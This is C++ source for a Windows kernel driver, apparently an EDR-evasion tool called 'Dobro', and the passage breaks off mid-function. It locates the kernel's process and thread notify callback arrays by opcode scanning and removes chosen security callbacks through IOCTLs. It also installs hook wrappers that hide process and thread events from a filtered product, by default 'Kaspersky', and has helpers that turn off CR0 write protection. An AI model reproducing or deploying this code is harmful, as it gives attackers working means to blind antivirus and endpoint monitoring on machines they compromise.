#include <ntifs.h>
#include <ntddk.h>
#include <intrin.h>
#include <Aux_klib.h>
#include "Common.h"
#include "Log.h"
#include "FsMinifilterProto.h"
#include "HelperPS.h"

#pragma intrinsic(__readmsr)

//////////////////////////////////////////////////////////////////////////
// Prototypes
//////////////////////////////////////////////////////////////////////////
VOID        DobroUnload(PDRIVER_OBJECT DriverObject);
NTSTATUS    DobroCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS    DobroDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp);

//////////////////////////////////////////////////////////////////////////
// Global vars
//////////////////////////////////////////////////////////////////////////
UCHAR g_ProcessStoreAddress[0x320];     // 8 byte array * 64 process callbacks
UCHAR g_ThreadStoreAddress[0x320];      // 8 byte array * 64 thread callbacks

WINDOWS_INDEX g_WindowsIndex;

// E8 - CALL
// E9 - JMP
// 2D - R13
// 3D - R15
UCHAR OPCODE_PSP[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe8, 0xe8, 0xe8 };

// Process callbacks
UCHAR OPCODE_LEA_R13_1[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4c, 0x4c, 0x4c };
UCHAR OPCODE_LEA_R13_2[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8d, 0x8d, 0x8d };
UCHAR OPCODE_LEA_R13_3[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2d, 0x2d, 0x2d };

// Thread callbacks
UCHAR OPCODE_LEA_RCX_1[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x48, 0x48 };
UCHAR OPCODE_LEA_RCX_2[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8d, 0x8d, 0x8d };
UCHAR OPCODE_LEA_RCX_3[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x0d, 0x0d };

//////////////////////////////////////////////////////////////////////////
// Hook notify callback
//////////////////////////////////////////////////////////////////////////
volatile PVOID  g_OrigPcreateProcessNotifyRoutine = NULL;
volatile PVOID  g_OrigPcreateThreadNotifyRoutine = NULL;
volatile LONG   g_typePsNotifyCallback = TYPE_EMPTY_NOTIFY;
volatile LONG   g_typeThrNotifyCallback = TYPE_EMPTY_NOTIFY;
volatile LONG   g_startHookFilterPS = FALSE;
volatile LONG   g_startHookFilterThr = FALSE;
WCHAR           g_filteredPsName[64] = L"Kaspersky";
WCHAR           g_filteredThrName[64] = L"Kaspersky";

void PcreateProcessNotifyRoutineEx2(
    PEPROCESS Process,
    HANDLE ProcessId,
    PPS_CREATE_NOTIFY_INFO CreateInfo)
{
    BOOLEAN IsFiltered = FALSE;

    if (g_startHookFilterPS)
    {
        if (CreateInfo)
        {
            IsFiltered = HlpPsIsFilteredPSByName(CreateInfo->ImageFileName, g_filteredPsName);
            if (!IsFiltered)
            {
                ((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)g_OrigPcreateProcessNotifyRoutine)(Process, ProcessId, CreateInfo);
            }
        }
        else
        {
            ((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)g_OrigPcreateProcessNotifyRoutine)(Process, ProcessId, CreateInfo);
        }
    }
    else
    {
        ((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)g_OrigPcreateProcessNotifyRoutine)(Process, ProcessId, CreateInfo);
    }

    return;
}

void PcreateProcessNotifyRoutineEx(
    PEPROCESS Process,
    HANDLE ProcessId,
    PPS_CREATE_NOTIFY_INFO CreateInfo)
{
    BOOLEAN IsFiltered = FALSE;

    if (g_startHookFilterPS)
    {
        if (CreateInfo)
        {
            IsFiltered = HlpPsIsFilteredPSByName(CreateInfo->ImageFileName, g_filteredPsName);
            if (!IsFiltered)
            {
                ((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)g_OrigPcreateProcessNotifyRoutine)(Process, ProcessId, CreateInfo);
            }
        }
        else
        {
            ((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)g_OrigPcreateProcessNotifyRoutine)(Process, ProcessId, CreateInfo);
        }
    }
    else
    {
        ((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)g_OrigPcreateProcessNotifyRoutine)(Process, ProcessId, CreateInfo);
    }

    return;
}

void PcreateProcessNotifyRoutine(
    HANDLE ParentId,
    HANDLE ProcessId,
    BOOLEAN Create)
{
    BOOLEAN IsFiltered = FALSE;

    if (g_startHookFilterPS)
    {
        if (Create)
        {
            IsFiltered = HlpPsIsFilteredPSByPid(ProcessId, g_filteredThrName);
            if (!IsFiltered)
            {
                ((PCREATE_PROCESS_NOTIFY_ROUTINE)g_OrigPcreateProcessNotifyRoutine)(ParentId, ProcessId, Create);
            }
        }
        else
        {
            ((PCREATE_PROCESS_NOTIFY_ROUTINE)g_OrigPcreateProcessNotifyRoutine)(ParentId, ProcessId, Create);
        }
    }
    else
    {
        ((PCREATE_PROCESS_NOTIFY_ROUTINE)g_OrigPcreateProcessNotifyRoutine)(ParentId, ProcessId, Create);
    }

    return;
}

void PcreateThreadNotifyRoutine(
    HANDLE ProcessId,
    HANDLE ThreadId,
    BOOLEAN Create)
{
    BOOLEAN IsFiltered = FALSE;

    if (g_startHookFilterThr)
    {
        IsFiltered = HlpPsIsFilteredPSByPid(ProcessId, g_filteredPsName);
        if (!IsFiltered)
        {
            return ((PCREATE_THREAD_NOTIFY_ROUTINE)g_OrigPcreateThreadNotifyRoutine)(ProcessId, ThreadId, Create);
        }
    }
    else
    {
        return ((PCREATE_THREAD_NOTIFY_ROUTINE)g_OrigPcreateThreadNotifyRoutine)(ProcessId, ThreadId, Create);
    }

    return;
}
//////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////
// Intel manipulate CR0 register
//////////////////////////////////////////////////////////////////////////
void CR0_WP_OFF_x64()
{
	cr0 mycr0;
	mycr0.flags = __readcr0();
	mycr0.write_protect = 0;
	__writecr0(mycr0.flags);
}

void CR0_WP_ON_x64()
{
	cr0 mycr0;
	mycr0.flags = __readcr0();
	mycr0.write_protect = 1;
	__writecr0(mycr0.flags);
}

//////////////////////////////////////////////////////////////////////////
// Get Windows version index
//////////////////////////////////////////////////////////////////////////
WINDOWS_INDEX GetWindowsIndex()
{
	NTSTATUS status = STATUS_SUCCESS;
	OSVERSIONINFOEXW osVersionInfo;
	osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
	status = RtlGetVersion((POSVERSIONINFOW)&osVersionInfo);
	NT_ASSERT(NT_SUCCESS(status));

	switch (osVersionInfo.dwBuildNumber)
	{
		case 2600:
			return WindowsIndexXP;
			break;
		case 3790:
			return WindowsIndex2K3;
			break;
		case 6000:
		case 6001:
		case 6002:
			return WindowsIndexVISTA;
			break;
		case 7600:
		case 7601:
			return WindowsIndexWIN7;
			break;
		case 8102:
		case 8250:
		case 9200:
			return WindowsIndexWIN8;
		case 9431:
		case 9600:
			return WindowsIndexWIN81;
			break;
		case 10240:
			return WindowsIndexWIN10_1507;
			break;
		case 10586:
			return WindowsIndexWIN10_1511;
			break;
		case 14393:
			return WindowsIndexWIN10_1607;
			break;
		case 15063:
			return WindowsIndexWIN10_1703;
			break;
		case 16299:
			return WindowsIndexWIN10_1709;
			break;
		case 17134:
			return WindowsIndexWIN10_1803;
			break;
		case 17763:
			return WindowsIndexWIN10_1809;
			break;
		case 18362:
			return WindowsIndexWIN10_1903;
			break;
		case 18363:
			return WindowsIndexWIN10_1909;
			break;
		case 19041:
			return WindowsIndexWIN10_2004;
			break;
		default:
			return WindowsIndexUNSUPPORTED;
	}
}

//////////////////////////////////////////////////////////////////////////
// Find PS callback notify routine
//////////////////////////////////////////////////////////////////////////
ULONG64 FindPspCreateProcessNotifyRoutine()
{
	LONG OffsetAddr = 0;
	ULONG64	i = 0;
	ULONG64 pCheckArea = 0;
	UNICODE_STRING unstrFunc;

	RtlInitUnicodeString(&unstrFunc, L"PsSetCreateProcessNotifyRoutine");
	pCheckArea = (ULONG64)MmGetSystemRoutineAddress(&unstrFunc);
	
    LOG("[+] PsSetCreateProcessNotifyRoutine is at address: %llx", pCheckArea);

	for (i = pCheckArea; i < pCheckArea + 20; i++)
	{
		if ((*(PUCHAR)i == OPCODE_PSP[g_WindowsIndex]))
		{
			OffsetAddr = 0;
			memcpy(&OffsetAddr, (PUCHAR)(i + 1), 4);
			pCheckArea = pCheckArea + (i - pCheckArea) + OffsetAddr + 5;
			break;
		}
	}

	LOG("[+] PspSetCreateProcessNotifyRoutine is at address: %llx", pCheckArea);

	for (i = pCheckArea; i < pCheckArea + 0xff; i++)
	{
		if (*(PUCHAR)i == OPCODE_LEA_R13_1[g_WindowsIndex] && *(PUCHAR)(i + 1) == OPCODE_LEA_R13_2[g_WindowsIndex] && *(PUCHAR)(i + 2) == OPCODE_LEA_R13_3[g_WindowsIndex])
		{
			OffsetAddr = 0;
			memcpy(&OffsetAddr, (PUCHAR)(i + 3), 4);
			return OffsetAddr + 7 + i;
		}
	}

	return 0;
}

//////////////////////////////////////////////////////////////////////////
// Find thread callback notify routine
//////////////////////////////////////////////////////////////////////////
ULONG64 FindPsSetCreateThreadNotifyRoutine()
{
	LONG OffsetAddr = 0;
	ULONG64	i = 0;
	ULONG64 pCheckArea = 0;
	UNICODE_STRING unstrFunc;

	RtlInitUnicodeString(&unstrFunc, L"PsSetCreateThreadNotifyRoutine");
	pCheckArea = (ULONG64)MmGetSystemRoutineAddress(&unstrFunc);

	LOG("[+] PsSetCreateThreadNotifyRoutine is at address: %llx", pCheckArea);

	for (i = pCheckArea; i < pCheckArea + 20; i++)
	{
		if ((*(PUCHAR)i == OPCODE_PSP[g_WindowsIndex]))
		{
			OffsetAddr = 0;
			memcpy(&OffsetAddr, (PUCHAR)(i + 1), 4);
			pCheckArea = pCheckArea + (i - pCheckArea) + OffsetAddr + 5;
			break;
		}
	}

	LOG("[+] PspSetCreateThreadNotifyRoutine is at address: %llx", pCheckArea);

	for (i = pCheckArea; i < pCheckArea + 0xff; i++)
	{	

		if (*(PUCHAR)i == OPCODE_LEA_RCX_1[g_WindowsIndex] && *(PUCHAR)(i + 1) == OPCODE_LEA_RCX_2[g_WindowsIndex] && *(PUCHAR)(i + 2) == OPCODE_LEA_RCX_3[g_WindowsIndex])
		{
			OffsetAddr = 0;
			memcpy(&OffsetAddr, (PUCHAR)(i + 3), 4);
			return OffsetAddr + 7 + i;
		}
	}

	return 0;
}

//////////////////////////////////////////////////////////////////////////
// Search module by address
//////////////////////////////////////////////////////////////////////////
NTSTATUS SearchModules(ULONG64 ModuleAddr, ModulesData* ModuleFound)
{
    NTSTATUS status = STATUS_SUCCESS;
    ULONG  modulesSize;
    AUX_MODULE_EXTENDED_INFO* modules;
    ULONG  numberOfModules, i;

    ModulesData ModuleFound2 = *ModuleFound;

    status = AuxKlibInitialize();
    if (!NT_SUCCESS(status))
    {
        LOG("AuxKlibInitialize fail %d", status);
        return status;
    }

    status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), NULL);
    if (!NT_SUCCESS(status) || modulesSize == 0)
        return status;

    numberOfModules = modulesSize / sizeof(AUX_MODULE_EXTENDED_INFO);

    modules = (AUX_MODULE_EXTENDED_INFO*)ExAllocatePoolWithTag(PagedPool, modulesSize, DRIVER_TAG);
    if (modules == NULL)
    {
        status = STATUS_INSUFFICIENT_RESOURCES;
        return status;
    }

    RtlZeroMemory(modules, modulesSize);

    status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), modules);
    if (!NT_SUCCESS(status))
    {
        ExFreePoolWithTag(modules, DRIVER_TAG);
        return status;
    }

    for (i = 0; i < numberOfModules; i++)
    {
        if (ModuleAddr > (ULONG64)modules[i].BasicInfo.ImageBase && ModuleAddr < ((ULONG64)modules[i].BasicInfo.ImageBase + modules[i].ImageSize))
        {
            LOG("Found: %s", modules[i].FullPathName + modules[i].FileNameOffset);

            strcpy(ModuleFound2.ModuleName, (CHAR*)(modules[i].FullPathName + modules[i].FileNameOffset));
            ModuleFound2.ModuleBase = (ULONG64)modules[i].BasicInfo.ImageBase;

            *ModuleFound = ModuleFound2;
            ExFreePoolWithTag(modules, DRIVER_TAG);

            return status;
        }
    }

    ExFreePoolWithTag(modules, DRIVER_TAG);

    return status;
}

//////////////////////////////////////////////////////////////////////////
// Gel list callback PS, THR and FS minifilters
//////////////////////////////////////////////////////////////////////////
int GetAllList(PVOID inBuf, ULONG lenInBuf)
{
    ULONG count = 0;
    ULONG maxCount;
    ModulesData ModuleFound;
    PCALLBACK_PS_FS buffer;

    buffer = (PCALLBACK_PS_FS)inBuf;
    maxCount = lenInBuf / sizeof(CALLBACK_PS_FS);
    if (maxCount == 0)
        return -1;

    ULONG64	PspCreateProcessNotifyRoutine = FindPspCreateProcessNotifyRoutine();
    ULONG64	PspCreateThreadNotifyRoutine = FindPsSetCreateThreadNotifyRoutine();

    ULONG64 i = 0;
    ULONG64	NotifyAddr = 0, MagicPtr = 0;
    ULONG64	NotifyAddr2 = 0, MagicPtr2 = 0;
    CALLBACK_PS_FS cbPsFs;

    if (PspCreateProcessNotifyRoutine)
    {
        for (i = 0; i < 64; i++)
        {
            MagicPtr = PspCreateProcessNotifyRoutine + i * 8;
            NotifyAddr = *(PULONG64)(MagicPtr);

            if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
            {
                NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
                LOG("[%d] CreateProcessNotifyRoutine: %llx", i, NotifyAddr);

                ::memset(&cbPsFs, 0, sizeof(cbPsFs));
                cbPsFs.Type = TYPE_CALLBACK_PS;
                cbPsFs.Index = i;
                cbPsFs.NotifyAddress = NotifyAddr;

                ::memset(&ModuleFound, 0, sizeof(ModuleFound));
                SearchModules(NotifyAddr, &ModuleFound);
                if (ModuleFound.ModuleBase != 0)
                {
                    ModuleFound.ModuleBase = NotifyAddr - ModuleFound.ModuleBase;
                    cbPsFs.ModuleBase = ModuleFound.ModuleBase;
                    ::memcpy(cbPsFs.chModuleName, ModuleFound.ModuleName, sizeof(cbPsFs.chModuleName) - 1);
                }
                else
                {
                    cbPsFs.ModuleBase = 0;
                    ::memcpy(cbPsFs.chModuleName, ModuleFound.ModuleName, sizeof(cbPsFs.chModuleName) - 1);
                }

                if (count >= maxCount)
                    return -1;

                ::memcpy(&buffer[count], &cbPsFs, sizeof(cbPsFs));
                count++;
            }
        }
    }

    if (PspCreateThreadNotifyRoutine)
    {
        for (i = 0; i < 64; i++)
        {
            MagicPtr2 = PspCreateThreadNotifyRoutine + i * 8;
            NotifyAddr2 = *(PULONG64)(MagicPtr2);

            if (MmIsAddressValid((PVOID)NotifyAddr2) && NotifyAddr2 != 0)
            {
                NotifyAddr2 = *(PULONG64)(NotifyAddr2 & 0xfffffffffffffff8);
                LOG("[%d] CreateThreadNotifyRoutine: %llx", i, NotifyAddr2);

                ::memset(&cbPsFs, 0, sizeof(cbPsFs));
                cbPsFs.Type = TYPE_CALLBACK_THR;
                cbPsFs.Index = i;
                cbPsFs.NotifyAddress = NotifyAddr2;

                ::memset(&ModuleFound, 0, sizeof(ModuleFound));
                SearchModules(NotifyAddr2, &ModuleFound);
                if (ModuleFound.ModuleBase != 0)
                {
                    ModuleFound.ModuleBase = NotifyAddr2 - ModuleFound.ModuleBase;
                    cbPsFs.ModuleBase = ModuleFound.ModuleBase;
                    ::memcpy(cbPsFs.chModuleName, ModuleFound.ModuleName, sizeof(cbPsFs.chModuleName) - 1);
                }
                else
                {

                    cbPsFs.ModuleBase = 0;
                    ::memcpy(cbPsFs.chModuleName, ModuleFound.ModuleName, sizeof(cbPsFs.chModuleName) - 1);
                }

                if (count >= maxCount)
                    return -1;

                ::memcpy(&buffer[count], &cbPsFs, sizeof(cbPsFs));
                count++;
            }
        }
    }

    PWCHAR data;
    ULONG cnt = FSH_GetListFilters(&data);
    for (i = 0; i < cnt; i++)
    {
        ::memset(&cbPsFs, 0, sizeof(cbPsFs));

        cbPsFs.Type = TYPE_CALLBACK_FS;
        cbPsFs.Index = i;
        ::memcpy(cbPsFs.wcModuleName, &data[i * DEF_MOD_NAME_LEN_SYM], DEF_MOD_NAME_LEN_SYM * sizeof(WCHAR));

        if (count >= maxCount)
            return -1;

        ::memcpy(&buffer[count], &cbPsFs, sizeof(cbPsFs));
        count++;
    }

    return count * sizeof(CALLBACK_PS_FS);
}

//////////////////////////////////////////////////////////////////////////
// Driver entry
//////////////////////////////////////////////////////////////////////////
extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);
    
    g_WindowsIndex = GetWindowsIndex();

	DriverObject->DriverUnload                          = DobroUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE]          = DobroCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE]           = DobroCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]  = DobroDeviceControl;

	UNICODE_STRING devName = RTL_CONSTANT_STRING(DEVICE_NAME);

	PDEVICE_OBJECT DeviceObject;
	NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &DeviceObject);
	if (!NT_SUCCESS(status))
    {
		LOG("[-] Failed to create device (0x%08X)", status);
		return status;
	}

	DeviceObject->Flags |= DO_BUFFERED_IO;

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(DEVICE_SYM_LINK);
	status = IoCreateSymbolicLink(&symLink, &devName);
	if (!NT_SUCCESS(status))
    {
		IoDeleteDevice(DeviceObject);

        LOG("[-] Failed to create symbolic link (0x%08X)", status);
        return status;
	}

    status = FSH_DriverEntry(DriverObject, RegistryPath);
    if (!NT_SUCCESS(status))
    {
        IoDeleteSymbolicLink(&symLink);
        IoDeleteDevice(DeviceObject);

        LOG("[-] Failed to create symbolic link (0x%08X)", status);
        return status;
    }

    LOG("[+] DriverEntry PS callbacks initialize success");

	return STATUS_SUCCESS;
}

//////////////////////////////////////////////////////////////////////////
// Driver unload
//////////////////////////////////////////////////////////////////////////
VOID DobroUnload(PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(DEVICE_SYM_LINK);

    if (g_typePsNotifyCallback == TYPE_PS_NOTIFY_EX2)
        PsSetCreateProcessNotifyRoutineEx2(PsCreateProcessNotifySubsystems, PcreateProcessNotifyRoutineEx2, TRUE);
    else if (g_typePsNotifyCallback == TYPE_PS_NOTIFY_EX)
        PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)PcreateProcessNotifyRoutineEx, TRUE);
    else if (g_typePsNotifyCallback == TYPE_PS_NOTIFY)
        PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)PcreateProcessNotifyRoutine, TRUE);

    if (g_typeThrNotifyCallback == TYPE_THREAD_NOTIFY)
         PsRemoveCreateThreadNotifyRoutine(PcreateThreadNotifyRoutine);

    FSH_Unload(DriverObject);

	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(DriverObject->DeviceObject);

	LOG("[+] Driver PS callbacks has been unloaded");
}

//////////////////////////////////////////////////////////////////////////
// Driver create & close
//////////////////////////////////////////////////////////////////////////
NTSTATUS DobroCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

//////////////////////////////////////////////////////////////////////////
// Display modules in DbgPrint
//////////////////////////////////////////////////////////////////////////
NTSTATUS DisplayModules()
{
    NTSTATUS status = STATUS_SUCCESS;
	ULONG  modulesSize;
	AUX_MODULE_EXTENDED_INFO* modules;
	ULONG  numberOfModules, i;

	status = AuxKlibInitialize();
	if (!NT_SUCCESS(status))
	{
		LOG("AuxKlibInitialize fail (0x%08X)", status);
		return status;
	}

	status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), NULL);
	if (!NT_SUCCESS(status) || modulesSize == 0)
		return status;

	numberOfModules = modulesSize / sizeof(AUX_MODULE_EXTENDED_INFO);

	modules = (AUX_MODULE_EXTENDED_INFO*)ExAllocatePoolWithTag(PagedPool, modulesSize, DRIVER_TAG);
	if (modules == NULL)
    {
		status = STATUS_INSUFFICIENT_RESOURCES;
		return status;
	}
	
    RtlZeroMemory(modules, modulesSize);

	status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), modules);
	if (!NT_SUCCESS(status))
    {
		ExFreePoolWithTag(modules, DRIVER_TAG);
		return status;
	}

    DbgPrint("[ ################################################################################ ]");
    DbgPrint("[ ### ImageBase\t\t\tImageSize\t\t\t\t\t\t  FileName  FullPathName");
	DbgPrint("[ ################################################################################ ]");
	for (i = 0; i < numberOfModules; i++)
	{
        DbgPrint("[%03d] %p\t0x%08x\t%30s  %s",
            i, 
            modules[i].BasicInfo.ImageBase, 
            modules[i].ImageSize, 
            modules[i].FullPathName + modules[i].FileNameOffset, 
            modules[i].FullPathName);
	}

	ExFreePoolWithTag(modules, DRIVER_TAG);

	return status;
}

//////////////////////////////////////////////////////////////////////////
// THR delete notify callback
//////////////////////////////////////////////////////////////////////////
bool ThrDeleteNotifyCallback(PVOID inBuf, PINFO_NOTIFY_CALLBACK infoNotifyCallback)
{
    NTSTATUS status;
    bool bRet = false;

    infoNotifyCallback->Type = TYPE_EMPTY_NOTIFY;
    infoNotifyCallback->NotifyAddress = 0;

    ULONG64	PspCreateThreadNotifyRoutine = FindPsSetCreateThreadNotifyRoutine();
    if (!PspCreateThreadNotifyRoutine)
        bRet;

    int i = 0;
    ULONG64	NotifyAddr = 0, MagicPtr = 0;
    DobroData* data = (DobroData*)inBuf;

    for (i = 0; i < 64; i++)
    {
        MagicPtr = PspCreateThreadNotifyRoutine + i * 8;
        NotifyAddr = *(PULONG64)(MagicPtr);
        if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
        {
            NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
            LOG("[%d] CreateThreadNotifyRoutine: %llx", i, NotifyAddr);

            if (data->index == i)
            {
                status = PsRemoveCreateThreadNotifyRoutine((PCREATE_THREAD_NOTIFY_ROUTINE)(NotifyAddr));
                if (NT_SUCCESS(status))
                {
                    infoNotifyCallback->Type = TYPE_THREAD_NOTIFY;
                    infoNotifyCallback->NotifyAddress = NotifyAddr;

                    bRet = true;

                    LOG("[+] Callback removed!");
                }
                else
                {
                    LOG("[-] Callback remove failed!");
                }

                break;
            }
        }
    }

    return bRet;
}
//////////////////////////////////////////////////////////////////////////
// PS delete notify callback
//////////////////////////////////////////////////////////////////////////
bool PsDeleteNotifyCallback(PVOID inBuf, PINFO_NOTIFY_CALLBACK infoNotifyCallback)
{
    NTSTATUS status;
    bool bRet = false;

    infoNotifyCallback->Type = TYPE_EMPTY_NOTIFY;
    infoNotifyCallback->NotifyAddress = 0;

    ULONG64	PspCreateProcessNotifyRoutine = FindPspCreateProcessNotifyRoutine();
    if (!PspCreateProcessNotifyRoutine)
        return bRet;

    int i = 0;
    ULONG64	NotifyAddr = 0, MagicPtr = 0;
    DobroData* data = (DobroData*)inBuf;

    for (i = 0; i < 64; i++)
    {
        MagicPtr = PspCreateProcessNotifyRoutine + i * 8;
        NotifyAddr = *(PULONG64)(MagicPtr);

        if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
        {
            NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
            LOG("[%d] CreateProcessNotifyRoutine: %llx", i, NotifyAddr);

            if (data->index == i)
            {
                status = PsSetCreateProcessNotifyRoutineEx2(PsCreateProcessNotifySubsystems, (PVOID)NotifyAddr, TRUE);
                if (NT_SUCCESS(status))
                {
                    infoNotifyCallback->Type = TYPE_PS_NOTIFY_EX2;
                    infoNotifyCallback->NotifyAddress = NotifyAddr;

                    bRet = true;
                    LOG("[+] PsSetCreateProcessNotifyRoutineEx2 callback removed!");
                    break;
                }
                else
                {
                    LOG("[!] PsSetCreateProcessNotifyRoutineEx2 callback remove failed!");
                }

                status = PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)NotifyAddr, TRUE);
                if (NT_SUCCESS(status))
                {
                    infoNotifyCallback->Type = TYPE_PS_NOTIFY_EX;
                    infoNotifyCallback->NotifyAddress = NotifyAddr;

                    bRet = true;
                    LOG("[+] PsSetCreateProcessNotifyRoutineEx callback removed!");
                    break;
                }
                else
                {
                    LOG("[!] PsSetCreateProcessNotifyRoutineEx callback remove failed!");
                }

                status = PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)NotifyAddr, TRUE);
                if (NT_SUCCESS(status))
                {
                    infoNotifyCallback->Type = TYPE_PS_NOTIFY;
                    infoNotifyCallback->NotifyAddress = NotifyAddr;

                    bRet = true;
                    LOG("[+] PsSetCreateProcessNotifyRoutine callback removed!");
                    break;
                }
                else
                {
                    LOG("[!] PsSetCreateProcessNotifyRoutine callback remove failed!");
                }

                LOG("[-] Failed to remove PS notify routine!");
                break;
            }
        }
    }

    return bRet;
}

//////////////////////////////////////////////////////////////////////////
// Driver device control
//////////////////////////////////////////////////////////////////////////
NTSTATUS DobroDeviceControl(PDEVICE_OBJECT, PIRP Irp)
{
    PIO_STACK_LOCATION  stack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS            status = STATUS_UNSUCCESSFUL;
    ULONG               inBufLength = 0;                // Input buffer length
    ULONG               outBufLength = 0;               // Output buffer length
    PVOID               inBuf = NULL, outBuf = NULL;    // Pointer to Input and output buffer
    ULONG               numWritten = 0;
    ULONG               ioContolCode = 0;

    inBufLength = stack->Parameters.DeviceIoControl.InputBufferLength;
    outBufLength = stack->Parameters.DeviceIoControl.OutputBufferLength;
    inBuf = Irp->AssociatedIrp.SystemBuffer;
    outBuf = Irp->AssociatedIrp.SystemBuffer;
    ioContolCode = stack->Parameters.DeviceIoControl.IoControlCode;

    if (ioContolCode == IOCTL_DOBRO_PROCESS_ZEROOUT_ARRAY    ||
        ioContolCode == IOCTL_DOBRO_PROCESS_DELETE_CALLBACK  ||
        ioContolCode == IOCTL_DOBRO_PROCESS_CALLBACK_RET     ||
        ioContolCode == IOCTL_DOBRO_PROCESS_ROLLBACK_RET     ||
        ioContolCode == IOCTL_DOBRO_THREAD_ZEROOUT_ARRAY     ||
        ioContolCode == IOCTL_DOBRO_THREAD_DELETE_CALLBACK   ||
        ioContolCode == IOCTL_DOBRO_THREAD_CALLBACK_RET      ||
        ioContolCode == IOCTL_DOBRO_THREAD_ROLLBACK_RET      ||
        ioContolCode == IOCTL_DOBRO_HOOK_MINIFILTER          ||
        ioContolCode == IOCTL_DOBRO_HOOK_CALLBACK_PS         ||
        ioContolCode == IOCTL_DOBRO_HOOK_CALLBACK_THR)
    {
        if (inBufLength != sizeof(DobroData)     ||  
            inBuf == NULL)
        {
            status = STATUS_INVALID_PARAMETER;
            goto End;
        }
    }

    if (ioContolCode == IOCTL_DOBRO_GET_LIST_ALL)
    {
        if (outBufLength != (sizeof(CALLBACK_PS_FS) * DEF_MOD_NAME_COUNT * 3) ||
            outBuf == NULL)
        {
            status = STATUS_INVALID_PARAMETER;
            goto End;
        }
    }

	switch (stack->Parameters.DeviceIoControl.IoControlCode)
	{
        case IOCTL_DOBRO_HOOK_CALLBACK_PS:
        {
            if (g_typePsNotifyCallback != TYPE_EMPTY_NOTIFY)
            {
                status = STATUS_ALREADY_REGISTERED;
                break;
            }

            DobroData* dobroData = (DobroData*)inBuf;
            dobroData->wcModuleName[DEF_MOD_NAME_LEN_SYM - 1] = L'\0';
            wcscpy_s(g_filteredPsName, DEF_MOD_NAME_LEN_SYM, dobroData->wcModuleName);

            INFO_NOTIFY_CALLBACK iNC;
            bool bRet = PsDeleteNotifyCallback(inBuf, &iNC);
            if (!bRet)
            {
                LOG("[-] Failed hook PS notify callback");
                break;
            }

            InterlockedExchange(&g_typePsNotifyCallback, iNC.Type);
            InterlockedExchangePointer(&g_OrigPcreateProcessNotifyRoutine, (PVOID)iNC.NotifyAddress);
            
            if (iNC.Type == TYPE_PS_NOTIFY_EX2)
                status = PsSetCreateProcessNotifyRoutineEx2(PsCreateProcessNotifySubsystems, PcreateProcessNotifyRoutineEx2, FALSE);
            else if (iNC.Type == TYPE_PS_NOTIFY_EX)
                status = PsSetCreateProcessNotifyRoutineEx(PcreateProcessNotifyRoutineEx, FALSE);
            else if (iNC.Type == TYPE_PS_NOTIFY)
                status = PsSetCreateProcessNotifyRoutine(PcreateProcessNotifyRoutine, FALSE);
            else
                status = STATUS_UNSUCCESSFUL;

            if (!NT_SUCCESS(status))
            {
                InterlockedExchange(&g_typePsNotifyCallback, TYPE_EMPTY_NOTIFY);
